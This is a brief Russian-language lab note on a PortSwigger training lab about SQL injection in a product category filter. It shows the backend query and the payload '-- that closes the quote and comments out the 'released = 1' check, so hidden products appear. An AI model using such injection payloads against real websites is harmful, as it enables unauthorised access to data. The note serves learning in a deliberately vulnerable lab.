SQL injection - уязвимость в категории фильтров

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Отображение всех продуктов, как выпущенных, так и не выпущенных

Анализ:

SELECT * FROM products WHERE category = 'Pets' AND released = 1

Вместо 'pets' ставим ' для проверки уязвим ли цель для SQL injection

SELECT * FROM products WHERE category = ''--' AND released = 1

'-- символ ' закрывает кавычку, а -- двойное тире будет комментировать всю оставшуюуся часть кода.

Ссылка на лаб:
https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data